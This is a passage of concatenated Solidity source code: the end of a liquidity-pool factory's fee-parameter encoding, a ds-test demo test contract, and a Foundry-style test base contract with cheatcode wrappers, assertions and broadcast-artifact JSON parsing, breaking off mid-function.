uint24 _maxVolatilityAccumulated\n    ) private pure returns (bytes32) {\n        if (_binStep < MIN_BIN_STEP || _binStep > MAX_BIN_STEP)\n            revert LBFactory__BinStepRequirementsBreached(MIN_BIN_STEP, _binStep, MAX_BIN_STEP);\n\n        if (_baseFactor > Constants.BASIS_POINT_MAX)\n            revert LBFactory__BaseFactorOverflows(_baseFactor, Constants.BASIS_POINT_MAX);\n\n        if (_filterPeriod >= _decayPeriod) revert LBFactory__DecreasingPeriods(_filterPeriod, _decayPeriod);\n\n        if (_reductionFactor > Constants.BASIS_POINT_MAX)\n            revert LBFactory__ReductionFactorOverflows(_reductionFactor, Constants.BASIS_POINT_MAX);\n\n        if (_protocolShare > MAX_PROTOCOL_SHARE)\n            revert LBFactory__ProtocolShareOverflows(_protocolShare, MAX_PROTOCOL_SHARE);\n\n        {\n            uint256 _baseFee = (uint256(_baseFactor) * _binStep) * 1e10;\n\n            // Can't overflow as the max value is `max(uint24) * (max(uint24) * max(uint16)) ** 2 < max(uint104)`\n            // It returns 18 decimals as:\n            // decimals(variableFeeControl * (volatilityAccumulated * binStep)**2 / 100) = 4 + (4 + 4) * 2 - 2 = 18\n            uint256 _prod = uint256(_maxVolatilityAccumulated) * _binStep;\n            uint256 _maxVariableFee = (_prod * _prod * _variableFeeControl) / 100;\n\n            if (_baseFee + _maxVariableFee > MAX_FEE)\n                revert LBFactory__FeesAboveMax(_baseFee + _maxVariableFee, MAX_FEE);\n        }\n\n        /// @dev It's very important that the sum of the sizes of those values is exactly 256 bits\n        /// here, (112 + 24) + 16 + 24 + 16 + 16 + 16 + 16 + 16 = 256\n        return\n            bytes32(\n                abi.encodePacked(\n                    uint136(_maxVolatilityAccumulated), // The first 112 bits are reserved for the dynamic parameters\n                    _protocolShare,\n                    _variableFeeControl,\n                    _reductionFactor,\n                    _decayPeriod,\n                    _filterPeriod,\n                    _baseFactor,\n                    _binStep\n                )\n            );\n    }\n\n    /// @notice Returns the LBPairInformation if it exists,\n    /// if not, then the address 0 is returned. The order doesn't matter\n    /// @param _tokenA The address of the first token of the pair\n    /// @param _tokenB The address of the second token of the pair\n    /// @param _binStep The bin step of the LBPair\n    /// @return The LBPairInformation\n    function _getLBPairInformation(\n        IERC20 _tokenA,\n        IERC20 _tokenB,\n        uint256 _binStep\n    ) private view returns (LBPairInformation memory) {\n        (_tokenA, _tokenB) = _sortTokens(_tokenA, _tokenB);\n        return _LBPairsInfo[_tokenA][_tokenB][_binStep];\n    }\n\n    /// @notice Private view function to sort 2 tokens in ascending order\n    /// @param _tokenA The first token\n    /// @param _tokenB The second token\n    /// @return The sorted first token\n    /// @return The sorted second token\n    function _sortTokens(IERC20 _tokenA, IERC20 _tokenB) private pure returns (IERC20, IERC20) {\n        if (_tokenA > _tokenB) (_tokenA, _tokenB) = (_tokenB, _tokenA);\n        return (_tokenA, _tokenB);\n    }\n}\n\n\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.5.0;\n\nimport \"../src/test.sol\";\n\ncontract DemoTest is DSTest {\n    function test_this() public pure {\n        require(true);\n    }\n    function test_logs() public {\n        emit log(\"-- log(string)\");\n        emit log(\"a string\");\n\n        emit log(\"-- log_named_uint(string, uint)\");\n        emit log_named_uint(\"uint\", 512);\n\n        emit log(\"-- log_named_int(string, int)\");\n        emit log_named_int(\"int\", -512);\n\n        emit log(\"-- log_named_address(string, address)\");\n        emit log_named_address(\"address\", address(this));\n\n        emit log(\"-- log_named_bytes32(string, bytes32)\");\n        emit log_named_bytes32(\"bytes32\", \"a string\");\n\n        emit log(\"-- log_named_bytes(string, bytes)\");\n        emit log_named_bytes(\"bytes\", hex\"cafefe\");\n\n        emit log(\"-- log_named_string(string, string)\");\n        emit log_named_string(\"string\", \"a string\");\n\n        emit log(\"-- log_named_decimal_uint(string, uint, uint)\");\n        emit log_named_decimal_uint(\"decimal uint\", 1.0e18, 18);\n\n        emit log(\"-- log_named_decimal_int(string, int, uint)\");\n        emit log_named_decimal_int(\"decimal int\", -1.0e18, 18);\n    }\n    event log_old_named_uint(bytes32,uint);\n    function test_old_logs() public {\n        emit log_old_named_uint(\"key\", 500);\n        emit log_named_bytes32(\"bkey\", \"val\");\n    }\n    function test_trace() public view {\n        this.echo(\"string 1\", \"string 2\");\n    }\n    function test_multiline() public {\n        emit log(\"a multiline\\\\nstring\");\n        emit log(\"a multiline string\");\n        emit log_bytes(\"a string\");\n        emit log_bytes(\"a multiline\\nstring\");\n        emit log_bytes(\"a multiline\\\\nstring\");\n        emit logs(hex\"0000\");\n        emit log_named_bytes(\"0x0000\", hex\"0000\");\n        emit logs(hex\"ff\");\n    }\n    function echo(string memory s1, string memory s2) public pure\n        returns (string memory, string memory)\n    {\n        return (s1, s2);\n    }\n\n    function prove_this(uint x) public {\n        emit log_named_uint(\"sym x\", x);\n        assertGt(x + 1, 0);\n    }\n\n    function test_logn() public {\n        assembly {\n            log0(0x01, 0x02)\n            log1(0x01, 0x02, 0x03)\n            log2(0x01, 0x02, 0x03, 0x04)\n            log3(0x01, 0x02, 0x03, 0x04, 0x05)\n        }\n    }\n\n    event MyEvent(uint, uint indexed, uint, uint indexed);\n    function test_events() public {\n        emit MyEvent(1, 2, 3, 4);\n    }\n\n    function test_asserts() public {\n        string memory err = \"this test has failed!\";\n        emit log(\"## assertTrue(bool)\\n\");\n        assertTrue(false);\n        emit log(\"\\n\");\n        assertTrue(false, err);\n\n        emit log(\"\\n## assertEq(address,address)\\n\");\n        assertEq(address(this), msg.sender);\n        emit log(\"\\n\");\n        assertEq(address(this), msg.sender, err);\n\n        emit log(\"\\n## assertEq32(bytes32,bytes32)\\n\");\n        assertEq32(\"bytes 1\", \"bytes 2\");\n        emit log(\"\\n\");\n        assertEq32(\"bytes 1\", \"bytes 2\", err);\n\n        emit log(\"\\n## assertEq(bytes32,bytes32)\\n\");\n        assertEq32(\"bytes 1\", \"bytes 2\");\n        emit log(\"\\n\");\n        assertEq32(\"bytes 1\", \"bytes 2\", err);\n\n        emit log(\"\\n## assertEq(uint,uint)\\n\");\n        assertEq(uint(0), 1);\n        emit log(\"\\n\");\n        assertEq(uint(0), 1, err);\n\n        emit log(\"\\n## assertEq(int,int)\\n\");\n        assertEq(-1, -2);\n        emit log(\"\\n\");\n        assertEq(-1, -2, err);\n\n        emit log(\"\\n## assertEqDecimal(int,int,uint)\\n\");\n        assertEqDecimal(-1.0e18, -1.1e18, 18);\n        emit log(\"\\n\");\n        assertEqDecimal(-1.0e18, -1.1e18, 18, err);\n\n        emit log(\"\\n## assertEqDecimal(uint,uint,uint)\\n\");\n        assertEqDecimal(uint(1.0e18), 1.1e18, 18);\n        emit log(\"\\n\");\n        assertEqDecimal(uint(1.0e18), 1.1e18, 18, err);\n\n        emit log(\"\\n## assertGt(uint,uint)\\n\");\n        assertGt(uint(0), 0);\n        emit log(\"\\n\");\n        assertGt(uint(0), 0, err);\n\n        emit log(\"\\n## assertGt(int,int)\\n\");\n        assertGt(-1, -1);\n        emit log(\"\\n\");\n        assertGt(-1, -1, err);\n\n        emit log(\"\\n## assertGtDecimal(int,int,uint)\\n\");\n        assertGtDecimal(-2.0e18, -1.1e18, 18);\n        emit log(\"\\n\");\n        assertGtDecimal(-2.0e18, -1.1e18, 18, err);\n\n        emit log(\"\\n## assertGtDecimal(uint,uint,uint)\\n\");\n        assertGtDecimal(uint(1.0e18), 1.1e18, 18);\n        emit log(\"\\n\");\n        assertGtDecimal(uint(1.0e18), 1.1e18, 18, err);\n\n        emit log(\"\\n## assertGe(uint,uint)\\n\");\n        assertGe(uint(0), 1);\n        emit log(\"\\n\");\n        assertGe(uint(0), 1, err);\n\n        emit log(\"\\n## assertGe(int,int)\\n\");\n        assertGe(-1, 0);\n        emit log(\"\\n\");\n        assertGe(-1, 0, err);\n\n        emit log(\"\\n## assertGeDecimal(int,int,uint)\\n\");\n        assertGeDecimal(-2.0e18, -1.1e18, 18);\n        emit log(\"\\n\");\n        assertGeDecimal(-2.0e18, -1.1e18, 18, err);\n\n        emit log(\"\\n## assertGeDecimal(uint,uint,uint)\\n\");\n        assertGeDecimal(uint(1.0e18), 1.1e18, 18);\n        emit log(\"\\n\");\n        assertGeDecimal(uint(1.0e18), 1.1e18, 18, err);\n\n        emit log(\"\\n## assertLt(uint,uint)\\n\");\n        assertLt(uint(0), 0);\n        emit log(\"\\n\");\n        assertLt(uint(0), 0, err);\n\n        emit log(\"\\n## assertLt(int,int)\\n\");\n        assertLt(-1, -1);\n        emit log(\"\\n\");\n        assertLt(-1, -1, err);\n\n        emit log(\"\\n## assertLtDecimal(int,int,uint)\\n\");\n        assertLtDecimal(-1.0e18, -1.1e18, 18);\n        emit log(\"\\n\");\n        assertLtDecimal(-1.0e18, -1.1e18, 18, err);\n\n        emit log(\"\\n## assertLtDecimal(uint,uint,uint)\\n\");\n        assertLtDecimal(uint(2.0e18), 1.1e18, 18);\n        emit log(\"\\n\");\n        assertLtDecimal(uint(2.0e18), 1.1e18, 18, err);\n\n        emit log(\"\\n## assertLe(uint,uint)\\n\");\n        assertLe(uint(1), 0);\n        emit log(\"\\n\");\n        assertLe(uint(1), 0, err);\n\n        emit log(\"\\n## assertLe(int,int)\\n\");\n        assertLe(0, -1);\n        emit log(\"\\n\");\n        assertLe(0, -1, err);\n\n        emit log(\"\\n## assertLeDecimal(int,int,uint)\\n\");\n        assertLeDecimal(-1.0e18, -1.1e18, 18);\n        emit log(\"\\n\");\n        assertLeDecimal(-1.0e18, -1.1e18, 18, err);\n\n        emit log(\"\\n## assertLeDecimal(uint,uint,uint)\\n\");\n        assertLeDecimal(uint(2.0e18), 1.1e18, 18);\n        emit log(\"\\n\");\n        assertLeDecimal(uint(2.0e18), 1.1e18, 18, err);\n\n        emit log(\"\\n## assertEq(string,string)\\n\");\n        string memory s1 = \"string 1\";\n        string memory s2 = \"string 2\";\n        assertEq(s1, s2);\n        emit log(\"\\n\");\n        assertEq(s1, s2, err);\n\n        emit log(\"\\n## assertEq0(bytes,bytes)\\n\");\n        assertEq0(hex\"abcdef01\", hex\"abcdef02\");\n        emit log(\"\\n\");\n        assertEq0(hex\"abcdef01\", hex\"abcdef02\", err);\n    }\n}\n\ncontract DemoTestWithSetUp {\n    function setUp() public {\n    }\n    function test_pass() public pure {\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity >=0.6.0 <0.9.0;\npragma experimental ABIEncoderV2;\n\nimport \"./Script.sol\";\nimport \"ds-test/test.sol\";\n\n// Wrappers around Cheatcodes to avoid footguns\nabstract contract Test is DSTest, Script {\n    using stdStorage for StdStorage;\n\n    uint256 internal constant UINT256_MAX =\n        115792089237316195423570985008687907853269984665640564039457584007913129639935;\n\n    StdStorage internal stdstore;\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                    STD-LOGS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    event log_array(uint256[] val);\n    event log_array(int256[] val);\n    event log_array(address[] val);\n    event log_named_array(string key, uint256[] val);\n    event log_named_array(string key, int256[] val);\n    event log_named_array(string key, address[] val);\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                    STD-CHEATS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    // Skip forward or rewind time by the specified number of seconds\n    function skip(uint256 time) internal {\n        vm.warp(block.timestamp + time);\n    }\n\n    function rewind(uint256 time) internal {\n        vm.warp(block.timestamp - time);\n    }\n\n    // Setup a prank from an address that has some ether\n    function hoax(address who) internal {\n        vm.deal(who, 1 << 128);\n        vm.prank(who);\n    }\n\n    function hoax(address who, uint256 give) internal {\n        vm.deal(who, give);\n        vm.prank(who);\n    }\n\n    function hoax(address who, address origin) internal {\n        vm.deal(who, 1 << 128);\n        vm.prank(who, origin);\n    }\n\n    function hoax(address who, address origin, uint256 give) internal {\n        vm.deal(who, give);\n        vm.prank(who, origin);\n    }\n\n    // Start perpetual prank from an address that has some ether\n    function startHoax(address who) internal {\n        vm.deal(who, 1 << 128);\n        vm.startPrank(who);\n    }\n\n    function startHoax(address who, uint256 give) internal {\n        vm.deal(who, give);\n        vm.startPrank(who);\n    }\n\n    // Start perpetual prank from an address that has some ether\n    // tx.origin is set to the origin parameter\n    function startHoax(address who, address origin) internal {\n        vm.deal(who, 1 << 128);\n        vm.startPrank(who, origin);\n    }\n\n    function startHoax(address who, address origin, uint256 give) internal {\n        vm.deal(who, give);\n        vm.startPrank(who, origin);\n    }\n\n    function changePrank(address who) internal {\n        vm.stopPrank();\n        vm.startPrank(who);\n    }\n\n    // creates a labeled address and the corresponding private key\n    function makeAddrAndKey(string memory name) internal returns(address addr, uint256 privateKey) {\n        privateKey = uint256(keccak256(abi.encodePacked(name)));\n        addr = vm.addr(privateKey);\n        vm.label(addr, name);\n    }\n\n    // creates a labeled address\n    function makeAddr(string memory name) internal returns(address addr) {\n        (addr,) = makeAddrAndKey(name);\n    }\n\n    // DEPRECATED: Use `deal` instead\n    function tip(address token, address to, uint256 give) internal {\n        emit log_named_string(\"WARNING\", \"Test tip(address,address,uint256): The `tip` stdcheat has been deprecated. Use `deal` instead.\");\n        stdstore\n            .target(token)\n            .sig(0x70a08231)\n            .with_key(to)\n            .checked_write(give);\n    }\n\n    // The same as Vm's `deal`\n    // Use the alternative signature for ERC20 tokens\n    function deal(address to, uint256 give) internal {\n        vm.deal(to, give);\n    }\n\n    // Set the balance of an account for any ERC20 token\n    // Use the alternative signature to update `totalSupply`\n    function deal(address token, address to, uint256 give) internal {\n        deal(token, to, give, false);\n    }\n\n    function deal(address token, address to, uint256 give, bool adjust) internal {\n        // get current balance\n        (, bytes memory balData) = token.call(abi.encodeWithSelector(0x70a08231, to));\n        uint256 prevBal = abi.decode(balData, (uint256));\n\n        // update balance\n        stdstore\n            .target(token)\n            .sig(0x70a08231)\n            .with_key(to)\n            .checked_write(give);\n\n        // update total supply\n        if(adjust){\n            (, bytes memory totSupData) = token.call(abi.encodeWithSelector(0x18160ddd));\n            uint256 totSup = abi.decode(totSupData, (uint256));\n            if(give < prevBal) {\n                totSup -= (prevBal - give);\n            } else {\n                totSup += (give - prevBal);\n            }\n            stdstore\n                .target(token)\n                .sig(0x18160ddd)\n                .checked_write(totSup);\n        }\n    }\n\n    function bound(uint256 x, uint256 min, uint256 max) internal virtual returns (uint256 result) {\n        require(min <= max, \"Test bound(uint256,uint256,uint256): Max is less than min.\");\n\n        uint256 size = max - min;\n\n        if (size == 0)\n        {\n            result = min;\n        }\n        else if (size == UINT256_MAX)\n        {\n            result = x;\n        }\n        else\n        {\n            ++size; // make `max` inclusive\n            uint256 mod = x % size;\n            result = min + mod;\n        }\n\n        emit log_named_uint(\"Bound Result\", result);\n    }\n\n    // Deploy a contract by fetching the contract bytecode from\n    // the artifacts directory\n    // e.g. `deployCode(code, abi.encode(arg1,arg2,arg3))`\n    function deployCode(string memory what, bytes memory args)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = abi.encodePacked(vm.getCode(what), args);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string,bytes): Deployment failed.\"\n        );\n    }\n\n    function deployCode(string memory what)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = vm.getCode(what);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string): Deployment failed.\"\n        );\n    }\n\n    /// deploy contract with value on construction\n    function deployCode(string memory what, bytes memory args, uint256 val)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = abi.encodePacked(vm.getCode(what), args);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(val, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string,bytes,uint256): Deployment failed.\"\n        );\n    }\n\n    function deployCode(string memory what, uint256 val)\n        internal\n        returns (address addr)\n    {\n        bytes memory bytecode = vm.getCode(what);\n        /// @solidity memory-safe-assembly\n        assembly {\n            addr := create(val, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(\n            addr != address(0),\n            \"Test deployCode(string,uint256): Deployment failed.\"\n        );\n    }\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                    STD-ASSERTIONS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    function fail(string memory err) internal virtual {\n        emit log_named_string(\"Error\", err);\n        fail();\n    }\n\n    function assertFalse(bool data) internal virtual {\n        assertTrue(!data);\n    }\n\n    function assertFalse(bool data, string memory err) internal virtual {\n        assertTrue(!data, err);\n    }\n\n    function assertEq(bool a, bool b) internal {\n        if (a != b) {\n            emit log                (\"Error: a == b not satisfied [bool]\");\n            emit log_named_string   (\"  Expected\", b ? \"true\" : \"false\");\n            emit log_named_string   (\"    Actual\", a ? \"true\" : \"false\");\n            fail();\n        }\n    }\n\n    function assertEq(bool a, bool b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function assertEq(bytes memory a, bytes memory b) internal {\n        assertEq0(a, b);\n    }\n\n    function assertEq(bytes memory a, bytes memory b, string memory err) internal {\n        assertEq0(a, b, err);\n    }\n\n    function assertEq(uint256[] memory a, uint256[] memory b) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log(\"Error: a == b not satisfied [uint[]]\");\n            emit log_named_array(\"  Expected\", b);\n            emit log_named_array(\"    Actual\", a);\n            fail();\n        }\n    }\n\n    function assertEq(int256[] memory a, int256[] memory b) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log(\"Error: a == b not satisfied [int[]]\");\n            emit log_named_array(\"  Expected\", b);\n            emit log_named_array(\"    Actual\", a);\n            fail();\n        }\n    }\n\n    function assertEq(address[] memory a, address[] memory b) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log(\"Error: a == b not satisfied [address[]]\");\n            emit log_named_array(\"  Expected\", b);\n            emit log_named_array(\"    Actual\", a);\n            fail();\n        }\n    }\n\n    function assertEq(uint256[] memory a, uint256[] memory b, string memory err) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function assertEq(int256[] memory a, int256[] memory b, string memory err) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n\n    function assertEq(address[] memory a, address[] memory b, string memory err) internal {\n        if (keccak256(abi.encode(a)) != keccak256(abi.encode(b))) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function assertApproxEqAbs(\n        uint256 a,\n        uint256 b,\n        uint256 maxDelta\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log            (\"Error: a ~= b not satisfied [uint]\");\n            emit log_named_uint (\"  Expected\", b);\n            emit log_named_uint (\"    Actual\", a);\n            emit log_named_uint (\" Max Delta\", maxDelta);\n            emit log_named_uint (\"     Delta\", delta);\n            fail();\n        }\n    }\n\n    function assertApproxEqAbs(\n        uint256 a,\n        uint256 b,\n        uint256 maxDelta,\n        string memory err\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log_named_string   (\"Error\", err);\n            assertApproxEqAbs(a, b, maxDelta);\n        }\n    }\n\n    function assertApproxEqAbs(\n        int256 a,\n        int256 b,\n        uint256 maxDelta\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log            (\"Error: a ~= b not satisfied [int]\");\n            emit log_named_int  (\"  Expected\", b);\n            emit log_named_int  (\"    Actual\", a);\n            emit log_named_uint (\" Max Delta\", maxDelta);\n            emit log_named_uint (\"     Delta\", delta);\n            fail();\n        }\n    }\n\n    function assertApproxEqAbs(\n        int256 a,\n        int256 b,\n        uint256 maxDelta,\n        string memory err\n    ) internal virtual {\n        uint256 delta = stdMath.delta(a, b);\n\n        if (delta > maxDelta) {\n            emit log_named_string   (\"Error\", err);\n            assertApproxEqAbs(a, b, maxDelta);\n        }\n    }\n\n    function assertApproxEqRel(\n        uint256 a,\n        uint256 b,\n        uint256 maxPercentDelta // An 18 decimal fixed point number, where 1e18 == 100%\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log                    (\"Error: a ~= b not satisfied [uint]\");\n            emit log_named_uint         (\"    Expected\", b);\n            emit log_named_uint         (\"      Actual\", a);\n            emit log_named_decimal_uint (\" Max % Delta\", maxPercentDelta, 18);\n            emit log_named_decimal_uint (\"     % Delta\", percentDelta, 18);\n            fail();\n        }\n    }\n\n    function assertApproxEqRel(\n        uint256 a,\n        uint256 b,\n        uint256 maxPercentDelta, // An 18 decimal fixed point number, where 1e18 == 100%\n        string memory err\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b, err); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log_named_string       (\"Error\", err);\n            assertApproxEqRel(a, b, maxPercentDelta);\n        }\n    }\n\n    function assertApproxEqRel(\n        int256 a,\n        int256 b,\n        uint256 maxPercentDelta\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log                   (\"Error: a ~= b not satisfied [int]\");\n            emit log_named_int         (\"    Expected\", b);\n            emit log_named_int         (\"      Actual\", a);\n            emit log_named_decimal_uint(\" Max % Delta\", maxPercentDelta, 18);\n            emit log_named_decimal_uint(\"     % Delta\", percentDelta, 18);\n            fail();\n        }\n    }\n\n    function assertApproxEqRel(\n        int256 a,\n        int256 b,\n        uint256 maxPercentDelta,\n        string memory err\n    ) internal virtual {\n        if (b == 0) return assertEq(a, b); // If the expected is 0, actual must be too.\n\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        if (percentDelta > maxPercentDelta) {\n            emit log_named_string      (\"Error\", err);\n            assertApproxEqRel(a, b, maxPercentDelta);\n        }\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                              JSON PARSING\n    //////////////////////////////////////////////////////////////*/\n\n   // Data structures to parse Transaction objects from the broadcast artifact\n   // that conform to EIP1559. The Raw structs is what is parsed from the JSON\n   // and then converted to the one that is used by the user for better UX.\n\n   struct RawTx1559 {\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        // json value name = function\n        string functionSig;\n        bytes32 hash;\n        // json value name = tx\n        RawTx1559Detail txDetail;\n        // json value name = type\n        string opcode;\n    }\n\n    struct RawTx1559Detail {\n        AccessList[] accessList;\n        bytes data;\n        address from;\n        bytes gas;\n        bytes nonce;\n        address to;\n        bytes txType;\n        bytes value;\n    }\n\n    struct Tx1559 {\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        string functionSig;\n        bytes32 hash;\n        Tx1559Detail txDetail;\n        string opcode;\n    }\n\n    struct Tx1559Detail {\n        AccessList[] accessList;\n        bytes data;\n        address from;\n        uint256 gas;\n        uint256 nonce;\n        address to;\n        uint256 txType;\n        uint256 value;\n    }\n\n   // Data structures to parse Transaction objects from the broadcast artifact\n   // that DO NOT conform to EIP1559. The Raw structs is what is parsed from the JSON\n   // and then converted to the one that is used by the user for better UX.\n\n    struct TxLegacy{\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        string functionSig;\n        string hash;\n        string opcode;\n        TxDetailLegacy transaction;\n    }\n\n    struct TxDetailLegacy{\n        AccessList[] accessList;\n        uint256 chainId;\n        bytes data;\n        address from;\n        uint256 gas;\n        uint256 gasPrice;\n        bytes32 hash;\n        uint256 nonce;\n        bytes1 opcode;\n        bytes32 r;\n        bytes32 s;\n        uint256 txType;\n        address to;\n        uint8 v;\n        uint256 value;\n    }\n\n    struct AccessList{\n        address accessAddress;\n        bytes32[] storageKeys;\n    }\n\n    // Data structures to parse Receipt objects from the broadcast artifact.\n    // The Raw structs is what is parsed from the JSON\n    // and then converted to the one that is used by the user for better UX.\n\n    struct RawReceipt {\n        bytes32 blockHash;\n        bytes blockNumber;\n        address contractAddress;\n        bytes cumulativeGasUsed;\n        bytes effectiveGasPrice;\n        address from;\n        bytes gasUsed;\n        RawReceiptLog[] logs;\n        bytes logsBloom;\n        bytes status;\n        address to;\n        bytes32 transactionHash;\n        bytes transactionIndex;\n    }\n\n    struct Receipt {\n        bytes32 blockHash;\n        uint256 blockNumber;\n        address contractAddress;\n        uint256 cumulativeGasUsed;\n        uint256 effectiveGasPrice;\n        address from;\n        uint256 gasUsed;\n        ReceiptLog[] logs;\n        bytes logsBloom;\n        uint256 status;\n        address to;\n        bytes32 transactionHash;\n        uint256 transactionIndex;\n    }\n\n    // Data structures to parse the entire broadcast artifact, assuming the\n    // transactions conform to EIP1559.\n\n    struct EIP1559ScriptArtifact {\n        string[] libraries;\n        string path;\n        string[] pending;\n        Receipt[] receipts;\n        uint256 timestamp;\n        Tx1559[] transactions;\n        TxReturn[] txReturns;\n    }\n\n    struct RawEIP1559ScriptArtifact {\n        string[] libraries;\n        string path;\n        string[] pending;\n        RawReceipt[] receipts;\n        TxReturn[] txReturns;\n        uint256 timestamp;\n        RawTx1559[] transactions;\n    }\n\n    struct RawReceiptLog {\n        // json value = address\n        address logAddress;\n        bytes32 blockHash;\n        bytes blockNumber;\n        bytes data;\n        bytes logIndex;\n        bool removed;\n        bytes32[] topics;\n        bytes32 transactionHash;\n        bytes transactionIndex;\n        bytes transactionLogIndex;\n    }\n\n    struct ReceiptLog {\n        // json value = address\n        address logAddress;\n        bytes32 blockHash;\n        uint256 blockNumber;\n        bytes data;\n        uint256 logIndex;\n        bytes32[] topics;\n        uint256 transactionIndex;\n        uint256 transactionLogIndex;\n        bool removed;\n    }\n\n    struct TxReturn {\n        string internalType;\n        string value;\n    }\n\n\n    function readEIP1559ScriptArtifact(string memory path)\n        internal\n        returns(EIP1559ScriptArtifact memory)\n    {\n        string memory data = vm.readFile(path);\n        bytes memory parsedData = vm.parseJson(data);\n        RawEIP1559ScriptArtifact memory rawArtifact = abi.decode(parsedData, (RawEIP1559ScriptArtifact));\n        EIP1559ScriptArtifact memory artifact;\n        artifact.libraries = rawArtifact.libraries;\n        artifact.path = rawArtifact.path;\n        artifact.timestamp = rawArtifact.timestamp;\n        artifact.pending = rawArtifact.pending;\n        artifact.txReturns = rawArtifact.txReturns;\n        artifact.receipts = rawToConvertedReceipts(rawArtifact.receipts);\n        artifact.transactions = rawToConvertedEIPTx1559s(rawArtifact.transactions);\n        return artifact;\n    }\n\n    function rawToConvertedEIPTx1559s(RawTx1559[] memory rawTxs)\n        internal\n        returns (Tx1559[] memory)\n    {\n        Tx1559[] memory txs = new Tx1559[](rawTxs.length);\n        for (uint i; i < rawTxs.length; i++) {\n            txs[i] = rawToConvertedEIPTx1559(rawTxs[i]);\n        }\n        return txs;\n    }\n\n    function rawToConvertedEIPTx1559(RawTx1559 memory rawTx)\n        internal\n        returns (Tx1559 memory)\n    {\n        Tx1559 memory transaction;\n        transaction.arguments = rawTx.arguments;\n        transaction.contractName = rawTx.contractName;\n        transaction.functionSig = rawTx.functionSig;\n        transaction.hash= rawTx.hash;\n        transaction.txDetail = rawToConvertedEIP1559Detail(rawTx.txDetail);\n        transaction.opcode= rawTx.opcode;\n    }\n\n    function rawToConvertedEIP1559Detail(RawTx1559Detail memory rawDetail)\n        internal\n        returns (Tx1559Detail memory)\n    {\n        Tx1559Detail memory txDetail;\n        txDetail.data = rawDetail.data;\n        txDetail.from = rawDetail.from;\n        txDetail.to = rawDetail.to;\n        txDetail.nonce = bytesToUint(rawDetail.nonce);\n        txDetail.txType = bytesToUint(rawDetail.txType);\n        txDetail.value = bytesToUint(rawDetail.value);\n        txDetail.gas = bytesToUint(rawDetail.gas);\n        txDetail.accessList = rawDetail.accessList;\n        return txDetail;\n\n    }\n\n    function readTx1559s(string memory path)\n        internal\n        returns (Tx1559[] memory)\n    {\n        string memory deployData = vm.readFile(path);\n        bytes memory parsedDeployData =\n            vm.parseJson(deployData, \".transactions\");\n        RawTx1559[] memory rawTxs = abi.decode(parsedDeployData, (RawTx1559[]));\n        return rawToConvertedEIPTx1559s(rawTxs);\n    }\n\n\n    function readTx1559(string memory path, uint256 index)\n        internal\n        returns (Tx1559 memory)\n    {\n        string memory deployData = vm.readFile(path);\n        string memory key = string(abi.encodePacked(\".transactions[\",vm.toString(index), \"]\"));\n        bytes memory parsedDeployData =\n            vm.parseJson(deployData, key);\n        RawTx1559 memory rawTx = abi.decode(parsedDeployData, (RawTx1559));\n        return rawToConvertedEIPTx1559(rawTx);\n    }\n\n\n    // Analogous to readTransactions, but for receipts.\n    function readReceipts(string memory path)\n        internal\n        returns (Receipt[] memory)\n    {\n        string memory deployData = vm.readFile(path);\n        bytes memory parsedDeployData = vm.parseJson(deployData, \".receipts\");\n        RawReceipt[] memory rawReceipts = abi.decode(parsedDeployData, (RawReceipt[]));\n        return rawToConvertedReceipts(rawReceipts);\n    }\n\n    function readReceipt(string memory path, uint index)\n        internal\n        returns (Receipt memory)\n    {\n        string memory deployData = vm.readFile(path);\n        string memory key = string(abi.encodePacked(\".receipts[\",vm.toString(index), \"]\"));\n        bytes memory parsedDeployData = vm.parseJson(deployData, key);\n        RawReceipt memory rawReceipt = 